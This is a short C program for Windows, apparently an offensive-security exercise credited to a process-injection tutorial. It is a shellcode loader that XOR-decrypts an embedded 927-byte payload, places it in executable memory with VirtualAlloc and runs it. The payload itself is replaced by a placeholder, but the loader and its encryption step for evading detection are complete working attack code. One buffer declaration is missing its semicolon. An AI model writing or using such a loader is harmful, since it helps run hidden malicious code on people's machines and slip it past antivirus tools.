// Inspired from: https://www.ired.team/offensive-security/code-injection-process-injection/process-injection


#include "stdio.h"
#include "Windows.h"

int main(int argc, char* argv[])
{
	/* length: 927 bytes */
	//unsigned char buf[] = "<removed>";

	// Shellcode encrypted with XOR (key=22)
	unsigned char buf[] = "<removed>"

	// Decrypt shellcode
	for (int x = 0; x < 927; x++) {
		*((char*)buf + x) = *((char*)buf + x) ^ '\x22';
	}

	// Self-inject
	void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof buf);
	((void(*)())exec)();

	return 0;
}
